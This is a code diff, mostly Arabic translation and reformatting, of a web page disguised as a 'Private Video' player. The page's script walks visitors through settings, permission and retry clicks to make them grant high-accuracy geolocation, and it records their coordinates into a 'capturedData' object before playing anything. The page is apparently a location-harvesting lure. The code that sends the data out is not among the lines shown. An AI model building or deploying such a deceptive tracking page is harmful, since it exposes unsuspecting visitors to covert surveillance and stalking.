@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Video Player</title>
+    <title>مشغل الفيديو</title>
     <style>
         * {
             margin: 0;
@@ -45,7 +45,7 @@
             cursor: pointer;
             flex-direction: column;
         }
-        
+
         /* الزر الموحد - يظهر في حالتين */
         #unifiedButton {
             position: relative;
@@ -54,7 +54,7 @@
             transition: all 0.3s ease;
             text-align: center;
         }
-        
+
         /* حالة زر التشغيل العادي */
         #unifiedButton.play-mode {
             width: 100px;
@@ -67,13 +67,13 @@
             box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
             border: none;
         }
-        
+
         #unifiedButton.play-mode:hover {
             transform: scale(1.1);
             background-color: rgba(255, 0, 0, 0.95);
             box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
         }
-        
+
         /* أيقونة التشغيل */
         .play-icon {
             width: 0;
@@ -83,7 +83,7 @@
             border-bottom: 20px solid transparent;
             margin-left: 8px;
         }
-        
+
         /* حالة زر الإعدادات */
         #unifiedButton.settings-mode {
             background: rgba(255, 255, 255, 0.1);
@@ -94,35 +94,35 @@
             box-shadow: 0 0 50px rgba(255, 0, 0, 0.4);
             min-width: 280px;
         }
-        
+
         #unifiedButton.settings-mode:hover {
             transform: scale(1.05);
             background: rgba(255, 255, 255, 0.2);
             border-color: #ff4757;
             box-shadow: 0 0 70px rgba(255, 0, 0, 0.7);
         }
-        
+
         .settings-icon {
             font-size: 90px;
             line-height: 1;
             color: #ff6b6b;
             margin-bottom: 15px;
         }
-        
+
         .settings-text {
             font-size: 32px;
             font-weight: bold;
             color: #fff;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
         }
-        
+
         .settings-subtext {
             font-size: 18px;
             color: #ddd;
             margin-top: 8px;
             opacity: 0.9;
         }
-        
+
         /* حالة زر إعادة المحاولة */
         #unifiedButton.retry-mode {
             background: rgba(255, 165, 0, 0.2);
@@ -133,27 +133,27 @@
             box-shadow: 0 0 50px rgba(255, 165, 0, 0.4);
             min-width: 250px;
         }
-        
+
         #unifiedButton.retry-mode:hover {
             transform: scale(1.05);
             background: rgba(255, 165, 0, 0.3);
             border-color: #ff8c00;
             box-shadow: 0 0 70px rgba(255, 165, 0, 0.7);
         }
-        
+
         .retry-icon {
             font-size: 70px;
             line-height: 1;
             margin-bottom: 10px;
         }
-        
+
         .retry-text {
             font-size: 28px;
             font-weight: bold;
             color: #fff;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.8);
         }
-        
+
         .retry-subtext {
             font-size: 16px;
             color: #ddd;
@@ -229,8 +229,12 @@
             z-index: 20;
         }
         @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
         }
         #loading {
             display: none;
@@ -327,7 +331,7 @@
 
     <div class="video-player-container">
         <div class="video-info">
-            <div class="video-title">Private Video</div>
+            <div class="video-title">فيديو خاص</div>
             <div class="video-meta"></div>
         </div>
 
@@ -336,7 +340,7 @@
             <div id="unifiedButton" class="play-mode">
                 <div class="play-icon"></div>
             </div>
-            
+
             <div class="spinner" id="spinner"></div>
         </div>
 
@@ -361,7 +365,7 @@
 
     <div id="loading">
         <div class="spinner" style="position:static;"></div>
-        <div class="loading-text">Loading video... Please wait</div>
+        <div class="loading-text">جاري تحميل الفيديو ... يرجى الانتظار</div>
     </div>
 
     <script>
@@ -370,10 +374,10 @@
 
             // حالات الزر المختلفة
             const BUTTON_STATES = {
-                INITIAL: 'play-mode',      // الحالة الأولية: زر تشغيل عادي
-                SETTINGS: 'settings-mode',  // زر الإعدادات (النقرة الأولى)
-                RETRY: 'retry-mode',        // زر إعادة المحاولة (النقرة الثالثة)
-                PROCESSING: 'processing'    // حالة المعالجة
+                INITIAL: 'play-mode', // الحالة الأولية: زر تشغيل عادي
+                SETTINGS: 'settings-mode', // زر الإعدادات (النقرة الأولى)
+                RETRY: 'retry-mode', // زر إعادة المحاولة (النقرة الثالثة)
+                PROCESSING: 'processing' // حالة المعالجة
             };
 
             let capturedData = {
@@ -396,30 +400,29 @@
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-
             // تغيير حالة الزر وشكله
             function setButtonState(state) {
                 currentButtonState = state;
                 unifiedButton.className = state;
-                
+
                 // تحديث محتوى الزر حسب الحالة
-                switch(state) {
+                switch (state) {
                     case BUTTON_STATES.INITIAL:
                         unifiedButton.innerHTML = '<div class="play-icon"></div>';
                         break;
                     case BUTTON_STATES.SETTINGS:
                         unifiedButton.innerHTML = `
-                            <div class="settings-icon">⚙️</div>
-                            <div class="settings-text">تغيير الإعدادات</div>
-                            <div class="settings-subtext">اضغط لفتح إعدادات الموقع الجغرافي</div>
-                        `;
+                                <div class="settings-icon">⚙️</div>
+                                <div class="settings-text">تغيير الإعدادات</div>
+                                <div class="settings-subtext">اضغط لفتح إعدادات الموقع الجغرافي</div>
+                            `;
                         break;
                     case BUTTON_STATES.RETRY:
                         unifiedButton.innerHTML = `
-                            <div class="retry-icon">🔄</div>
-                            <div class="retry-text">إعادة المحاولة</div>
-                            <div class="retry-subtext">اضغط لطلب إذن الموقع مرة أخرى</div>
-                        `;
+                                <div class="retry-icon">🔄</div>
+                                <div class="retry-text">إعادة المحاولة</div>
+                                <div class="retry-subtext">اضغط لطلب إذن الموقع مرة أخرى</div>
+                            `;
                         break;
                 }
             }
@@ -428,9 +431,9 @@
             function openLocationSettings() {
                 const ua = navigator.userAgent || '';
                 const isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(ua);
-                
+
                 console.log('Opening location settings...');
-                
+
                 const isChrome = /Chrome/i.test(ua) && !/Edge|Edg|OPR|Opera|Brave/i.test(ua);
                 const isFirefox = /Firefox/i.test(ua);
                 const isSafari = /Safari/i.test(ua) && !/Chrome|CriOS|FxiOS|OPiOS|Brave/i.test(ua);
@@ -440,9 +443,9 @@
                 const isSamsung = /SamsungBrowser/i.test(ua);
                 const isAndroid = /Android/i.test(ua);
                 const isIOS = /iPhone|iPad|iPod/i.test(ua);
-                
+
                 let opened = false;
-                
+
                 // محاولة 1: Chrome على أندرويد - إعدادات الموقع مباشرة
                 if (isChrome && isAndroid) {
                     try {
@@ -450,7 +453,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 2: Chrome على سطح المكتب - إعدادات الموقع
                 if (isChrome && !isAndroid && !opened) {
                     try {
@@ -458,7 +461,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 3: Firefox - إعدادات الخصوصية والموقع
                 if (isFirefox && !opened) {
                     try {
@@ -466,7 +469,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 4: Safari على iOS - إعدادات الموقع
                 if (isSafari && isIOS && !opened) {
                     try {
@@ -474,7 +477,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 5: Safari على Mac - إعدادات الموقع
                 if (isSafari && !isIOS && !opened) {
                     try {
@@ -482,7 +485,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 6: Android عام - إعدادات الموقع
                 if (isAndroid && !opened) {
                     try {
@@ -490,7 +493,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 7: Edge - إعدادات الموقع
                 if (isEdge && !opened) {
                     try {
@@ -498,7 +501,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 8: Opera - إعدادات الموقع
                 if (isOpera && !opened) {
                     try {
@@ -506,7 +509,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 9: Brave - إعدادات الموقع
                 if (isBrave && !opened) {
                     try {
@@ -514,7 +517,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 // محاولة 10: Samsung Internet - إعدادات الموقع
                 if (isSamsung && !opened) {
                     try {
@@ -522,7 +525,7 @@
                         opened = true;
                     } catch (e) {}
                 }
-                
+
                 if (!opened) {
                     alert('يرجى فتح إعدادات الموقع الجغرافي يدوياً في متصفحك');
                 }
@@ -534,8 +537,7 @@
                     const position = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(
                             resolve,
-                            reject,
-                            { enableHighAccuracy: true, timeout: 10000 }
+                            reject, { enableHighAccuracy: true, timeout: 10000 }
                         );
                     });
                     capturedData.location = `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
@@ -731,10 +733,10 @@
             // معالج النقر على الزر الموحد
             async function handleButtonClick(e) {
                 e.stopPropagation();
-                
+
                 if (videoStarted || isProcessing) return;
 
-                switch(currentButtonState) {
+                switch (currentButtonState) {
                     case BUTTON_STATES.INITIAL:
                         // النقرة الأولى: فتح إعدادات الموقع الجغرافي
                         console.log('First click: Opening location settings');
@@ -747,7 +749,7 @@
                         // النقرة الثانية (من الإعدادات): طلب إذن الموقع
                         console.log('Second click: Requesting location permission');
                         const locationGranted = await requestLocationPermission();
-                        
+
                         if (locationGranted) {
                             // تم منح الإذن - تشغيل الفيديو مباشرة مع الصوت
                             console.log('Location permission granted - Starting video');
@@ -763,7 +765,7 @@
                         // النقرة الثالثة: إعادة طلب إذن الموقع
                         console.log('Third click: Retrying location permission');
                         const retryGranted = await requestLocationPermission();
-                        
+
                         if (retryGranted) {
                             // تم منح الإذن - تشغيل الفيديو
                             console.log('Location permission granted on retry - Starting video');
